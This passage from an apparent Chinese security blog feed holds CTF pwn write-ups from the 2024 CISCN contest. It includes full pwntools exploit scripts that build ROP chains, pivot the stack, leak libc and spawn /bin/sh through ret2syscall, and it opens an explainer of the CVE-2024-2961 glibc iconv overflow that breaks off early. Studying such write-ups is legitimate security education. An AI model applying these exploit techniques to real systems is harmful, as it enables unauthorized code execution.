class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.94.202.237&quot;</span>,<span class="number">36894</span>)</span><br><span class="line"><span class="comment">#-0x29d90</span></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_reg(15,0,0xd20)  0x1000</span></span><br><span class="line"><span class="comment"># +write_reg(1,0,0x118)+write_reg(2,0,0x100)+write_reg(3,0,0xd38)+sub(4,1,2)+mul(5,4,4)</span></span><br><span class="line"><span class="comment"># payload += mul(5,5,17)*5 + sub(5,5,15)*6</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">&quot;opcode:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>





<h4 id="pwn-novel1"><a href="#pwn-novel1" class="headerlink" title="pwn-novel1"></a>pwn-novel1</h4><p>C++编译出来的一个二进制文件，直接IDA静态分析有点头大，先运行看看大致功能。</p>
<p>首先会让我们输入Author的名字，然后有两种选项可供选择。第一个选项会让我们输入Blood和Evidence，其中Blood是一个序号，且不能多次设置同一个Blood位置；Evidence看不出来是干什么的，但是会发现字母是不行的，可以输入数字。根据命名bloodstain（血迹），以及Evidence（线索），我们先猜测是跟着某种线索寻找血迹。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104213341948.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104213711557.png"
                      class=""
                >

<p>用2号功能大概是找相似的血迹，但目前并不清楚具体原理。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250104232309225.png"
                      class=""
                >

<p>之后还是得看静态反汇编出的代码，这里的unordered_map实际上c++的一个模板类，其具体函数的作用其实我们能够查到。常用函数如下。就功能而言，unordered_map类似于python中的字典类型，提供一个键值对的映射。</p>
<p><strong>1. 构造与初始化</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>unordered_map()</code></td>
<td>默认构造函数，创建一个空的 <code>unordered_map</code> 对象。</td>
</tr>
<tr>
<td><code>unordered_map(initializer_list)</code></td>
<td>用列表初始化构造。</td>
</tr>
<tr>
<td><code>unordered_map(begin, end)</code></td>
<td>用迭代器范围构造 unordered_map。</td>
</tr>
<tr>
<td><code>unordered_map(other)</code></td>
<td>拷贝构造函数，用另一个 <code>unordered_map</code> 初始化本对象。</td>
</tr>
<tr>
<td><code>unordered_map(other, std::move)</code></td>
<td>移动构造函数，转移另一个对象的资源。</td>
</tr>
</tbody></table>
<hr>
<p><strong>2. 插入与更新元素</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>insert(const pair&lt;Key, T&gt;&amp; val)</code></td>
<td>插入键值对，如果键已存在，不插入。</td>
</tr>
<tr>
<td><code>insert_or_assign(key, value)</code></td>
<td>插入或更新指定键对应的值。</td>
</tr>
<tr>
<td><code>emplace(args...)</code></td>
<td>原地构造插入，避免不必要的拷贝或移动。</td>
</tr>
<tr>
<td><code>emplace_hint(pos, args...)</code></td>
<td>在给定位置提示的地方原地插入元素。</td>
</tr>
<tr>
<td><code>operator[key]</code></td>
<td>通过 <code>[]</code> 访问元素，若键不存在则插入新键并返回默认值。</td>
</tr>
<tr>
<td><code>at(key)</code></td>
<td>访问元素，若键不存在则抛出 <code>std::out_of_range</code> 异常。</td>
</tr>
<tr>
<td><code>try_emplace(key, args...)</code></td>
<td>若键不存在则插入新值，若键存在则什么都不做。</td>
</tr>
</tbody></table>
<hr>
<p><strong>3. 删除元素</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>erase(key)</code></td>
<td>删除指定键的元素，返回删除的元素个数（0 或 1）。</td>
</tr>
<tr>
<td><code>erase(iterator)</code></td>
<td>删除迭代器指定位置的元素。</td>
</tr>
<tr>
<td><code>erase(begin, end)</code></td>
<td>删除迭代器范围 <code>[begin, end)</code> 内的元素。</td>
</tr>
<tr>
<td><code>clear()</code></td>
<td>清空 <code>unordered_map</code> 中的所有元素。</td>
</tr>
</tbody></table>
<hr>
<p><strong>4. 查找元素</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>find(key)</code></td>
<td>返回指向键的迭代器，若键不存在，返回 <code>end()</code>。</td>
</tr>
<tr>
<td><code>contains(key)</code></td>
<td>检查容器是否包含某个键，返回 <code>true</code> 或 <code>false</code>。</td>
</tr>
<tr>
<td><code>count(key)</code></td>
<td>返回指定键出现的次数（对于 <code>unordered_map</code> 始终为 0 或 1）。</td>
</tr>
<tr>
<td><code>equal_range(key)</code></td>
<td>返回表示与指定键关联的元素范围的迭代器对。</td>
</tr>
</tbody></table>
<hr>
<p><strong>5. 容量相关</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>empty()</code></td>
<td>检查容器是否为空，返回 <code>true</code> 或 <code>false</code>。</td>
</tr>
<tr>
<td><code>size()</code></td>
<td>返回元素个数。</td>
</tr>
<tr>
<td><code>max_size()</code></td>
<td>返回容器支持的最大元素数量。</td>
</tr>
</tbody></table>
<hr>
<p><strong>6. 哈希表相关</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>bucket_count()</code></td>
<td>返回哈希表中的桶数量。</td>
</tr>
<tr>
<td><code>bucket_size(bucket)</code></td>
<td>返回指定桶中的元素数量。</td>
</tr>
<tr>
<td><code>bucket(key)</code></td>
<td>返回键映射到的桶索引。</td>
</tr>
<tr>
<td><code>load_factor()</code></td>
<td>返回当前的加载因子（元素数量 &#x2F; 桶数量）。</td>
</tr>
<tr>
<td><code>max_load_factor(factor)</code></td>
<td>获取或设置最大的加载因子。</td>
</tr>
<tr>
<td><code>rehash(n)</code></td>
<td>将桶数量调整为至少为 <code>n</code>，以最小化冲突。</td>
</tr>
<tr>
<td><code>reserve(n)</code></td>
<td>预留足够的空间，调整桶数量使容器能存储至少 <code>n</code> 个元素。</td>
</tr>
<tr>
<td><code>hash_function()</code></td>
<td>返回用于计算哈希值的哈希函数对象。</td>
</tr>
<tr>
<td><code>key_eq()</code></td>
<td>返回用于比较键是否相等的函数对象。</td>
</tr>
</tbody></table>
<hr>
<p><strong>7. 迭代器相关</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>begin()</code></td>
<td>返回指向容器第一个元素的迭代器。</td>
</tr>
<tr>
<td><code>cbegin()</code></td>
<td>返回指向容器第一个元素的只读迭代器。</td>
</tr>
<tr>
<td><code>end()</code></td>
<td>返回指向容器末尾的迭代器。</td>
</tr>
<tr>
<td><code>cend()</code></td>
<td>返回指向容器末尾的只读迭代器。</td>
</tr>
<tr>
<td><code>rbegin()</code></td>
<td>返回指向容器最后一个元素的反向迭代器。</td>
</tr>
<tr>
<td><code>rend()</code></td>
<td>返回指向容器第一个元素之前的反向迭代器。</td>
</tr>
</tbody></table>
<hr>
<p><strong>8. 比较两个 unordered_map</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>operator==</code></td>
<td>判断两个 <code>unordered_map</code> 是否相等。</td>
</tr>
<tr>
<td><code>operator!=</code></td>
<td>判断两个 <code>unordered_map</code> 是否不相等。</td>
</tr>
</tbody></table>
<p>那么我们先看part1的功能，首先<strong>bloodstains</strong>是一个模板类，其键为unsigned int类型，值为unsigned long类型。然后这个模板类中不能含有超过31个键值对，否则会调用fragment退出。而且后面通过find寻找我们输入的键，如果找到就退出，说明限制了不能有相同的键。最后对result的两次操作会为键值对赋值。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250105145338871.png"
                      class=""
                >

<p>之后看part2功能，这里首先是从bloodstains中，寻找我们输入的Blood键是否在其中，如果不在就直接退出。然后我们需要理解一下bucket这个桶的机制。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250122160017991.png"
                      class=""
                >

<p><strong>1. 桶的管理机制</strong></p>
<ol>
<li><strong>哈希函数与桶的分布</strong>:<ul>
<li><code>unordered_map</code> 使用 <strong>哈希函数</strong> 对键 (key) 进行散列，计算哈希值。</li>
<li>通过以下公式确定键值对存储的桶索引： $bucket\ index&#x3D;hash(key) %bucket\ count$</li>
<li><code>bucket_count</code> 是当前的桶数量（可以随装载因子（load factor）变化自动调整）。</li>
</ul>
</li>
<li><strong>桶的内部结构</strong>:<ul>
<li>每个桶可能存储多个键值对，冲突的键值对以链表或其他数据结构（如树）存储在同一桶中。</li>
<li>冲突（collision）发生时，<code>unordered_map</code> 使用 <strong>开放地址法</strong> 或 <strong>分离链法</strong> 等策略来解决。</li>
</ul>
</li>
<li><strong>装载因子与桶重分配</strong>:<ul>
<li>装载因子 (Load Factor)：表示哈希表的密度，公式为：$\text{load factor} &#x3D; \frac{\text{size}}{\text{bucket count}}$</li>
<li>如果装载因子超出预设值，<code>unordered_map</code> 会自动 <strong>增大桶的数量</strong>（通常翻倍），并重新分配键值对以减少冲突。</li>
</ul>
</li>
</ol>
<hr>
<p><strong>2. 哪些键值对会存在一个桶里</strong></p>
<ol>
<li><strong>相同哈希值的键</strong>:<ul>
<li>当两个键的哈希值相同时，这两个键的键值对会落入同一个桶中。</li>
<li>哈希表仅使用哈希值确定桶索引，因此不能保证桶内的键值对顺序。</li>
</ul>
</li>
<li><strong>解决冲突：键的等价性</strong>:<ul>
<li>即使键的哈希值相同，也需要使用等价性比较（通常是 <code>operator==</code>）来确认键是否完全相等。</li>
<li>如果键通过 <code>==</code> 比较不同，<code>unordered_map</code> 将允许它们共存于一个桶中（但不会作为同一键处理）。</li>
</ul>
</li>
<li><strong>插入新键值对</strong>:<ul>
<li>当插入一个新键时，unordered_map<ol>
<li>通过哈希函数计算出桶索引。</li>
<li>遍历该桶内的链表，检查是否有等价键（利用 <code>==</code> 比较）。</li>
<li>若存在等价键，覆盖其值；否则将新键值对插入该桶。</li>
</ol>
</li>
</ul>
</li>
</ol>
<p>我们动调时发现，在part2功能里的copy函数中，会往栈上写内容。这里比如我们在part1功能中先输入键为3，值为4。然后对比copy执行前后，发现这里往栈上写了键值对&lt;3,4&gt;，其实我们仔细分析copy函数的参数，能发现一个**_Local_iterator**迭代器，这里其实就是把在一个桶中的键值存到栈上。那么只要我们把用part1功能加入hash冲突并在同一个桶里的多个键，就能够往栈上隔8字节写一个可控的值，这里返回地址刚好可以被值覆盖。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250122231726637.png"
                      class=""
                >

<p>之后我们的目标就是找到hash冲突的键，这道题其实指定重载了hash函数，是一个模除运算。那么我们可以打断点（<code>b std::__detail::_Mod_range_hashing::operator()</code>）进行调试，这里我们把键设置为4，值设置为3看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250123180738173.png"
                      class=""
                >

<p>总共会在断点停下两次，第二次到断点时，我们能发现一个0xd的模数。这个数字是固定的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124013848801.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124174005151.png"
                      class=""
                >

<p>然后我们发现只要其键是在模13的某个剩余类中，其就会存在一个桶里，而且是通过堆上的一个管理块进行管理的，在一个桶中的元素用一个链表连起来。那么我们就可以通过part2的copy函数实现栈溢出。比如我们键为1和14，值都设置为0x666，那么copy执行后可以看到栈顶就为这两个键值对。经过计算，我们设置21个冲突的键就能覆盖到返回地址处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124014128627.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124170922342.png"
                      class=""
                >

<p>但是在调试时，如果直接循环写入21个，会发现最终只会写到栈上一个。经过尝试，最终发现临界点是写入13个，这正好是我们的模数。C++ 中的 <code>std::unordered_map</code> 动态扩展机制类似于 C 的动态数组，会根据负载因子自动扩容（从 13 扩展到 29），新桶数组重新哈希分配，链表通过索引计算（如 <code>i * 29</code>）重新串联。这个29可以通过调试出来。之后会申请一个更大的0xf0大小的管理块，处理完毕后原来0x70大小的管理块会被释放掉。因为我们只用21个就能覆盖到返回地址，所以我们一开始都用模29的进行冲突，那么其扩容后就刚好可以存在一个桶里。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124174537805.png"
                      class=""
                >

<p>之后就是构造ROP链，程序里留下了一些gadget。其中有个gadget可以控制rsp。而且一开始的prologue功能中能够往一个author全局变量中读取0x80字节的内容，这个author的地址我们又可以获知。那么我们可以把栈迁移到author处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124185257849.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124192217525.png"
                      class=""
                >

<p>之后我们进行rop链构建，这里还有点麻烦的是，我们按顺序调用part1，最后用part2写到栈上时，顺序有所打乱，分界点也就是一开始的模数0xd，这里我把占位的value全换成了调用part1的顺序，可以清楚看到复制到栈上的逻辑。那么我们直接把对应返回地址的位置的内容换为我们的gadget以及author地址即可。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124192500030.png"
                      class=""
                >

<p>栈迁移之后就正常retlibc即可。后面要返回主函数再次往author中读入getshell的rop，由于前面把栈迁移到了这里，在调用一些函数时可能会把返回地址覆盖了，导致会出现问题。所以我们第二次写rop时要把fgets的返回地址给还原，call过去时rsp指向author+8，那么返回地址就在author的地址处。之后布局好rop后就能直接靠prologue的ret返回了。注意栈对齐，而且如果直接调用system的话，其申请的栈空间有点多，我们又做过栈迁移，会导致执行时栈到了不可写的段从而失败，这里我们就ret2syscall。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124210031726.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124211116655.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124211906895.png"
                      class=""
                >

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./novel1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;47.94.95.135&quot;, 22566)</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">puts_plt = <span class="number">0x0000000000402460</span></span><br><span class="line">puts_got = <span class="number">0x000000000040A108</span></span><br><span class="line">pop_rax_rsp_rdi_rbp_ret = <span class="number">0x0000000004025BE</span></span><br><span class="line">main = <span class="number">0x0000000000402D23</span></span><br><span class="line">ret = <span class="number">0x000000000040201a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">part1</span>(<span class="params">idx,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Chapter:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Blood:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Evidence:&quot;</span>,<span class="built_in">str</span>(value).encode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">part2</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Chapter:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Blood:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">author = <span class="number">0x000000000040A540</span></span><br><span class="line">rop = p64(puts_got)+p64(<span class="number">0</span>)+p64(puts_plt)+p64(main)</span><br><span class="line"><span class="comment"># rop += p64(pop_rsp_rdi_rbp_ret)+p64(author+)+p64(0)*2+p64(main)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Author:&quot;</span>,rop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xb</span>):</span><br><span class="line">    part1(<span class="number">1</span>+<span class="number">29</span>*i,i)</span><br><span class="line">part1(<span class="number">1</span>+<span class="number">29</span>*<span class="number">0xb</span>,pop_rax_rsp_rdi_rbp_ret)</span><br><span class="line">part1(<span class="number">1</span>+<span class="number">29</span>*<span class="number">0xc</span>,author)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xd</span>,<span class="number">0x16</span>):</span><br><span class="line">    part1(<span class="number">1</span>+<span class="number">29</span>*i,i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">part2(<span class="number">1</span>)</span><br><span class="line">libc_base = get_addr(p) - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x00000000000904a9</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0x000000000040285A</span>)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(author+<span class="number">0x60</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_rbx_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Author:&quot;</span>,rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ciscn</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2024-2961</title>
    <url>/blog/2024/09/21/CVE-2024-2961/</url>
    <content><![CDATA[<h4 id="一、利用目的"><a href="#一、利用目的" class="headerlink" title="一、利用目的"></a>一、利用目的</h4><p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
<h4 id="二、利用方式"><a href="#二、利用方式" class="headerlink" title="二、利用方式"></a>二、利用方式</h4><p>以从UTF-8转义到ISO-2022-CN-EXT为例。要触发此漏洞，我们需要迫使iconv()在输出缓冲区结束前发出一个转义序列。为此，我们可以使用诸如“劄”、“䂚”、“峛“等特殊字符。这将导致1到3字节的溢出，其溢出内容如下：</p>
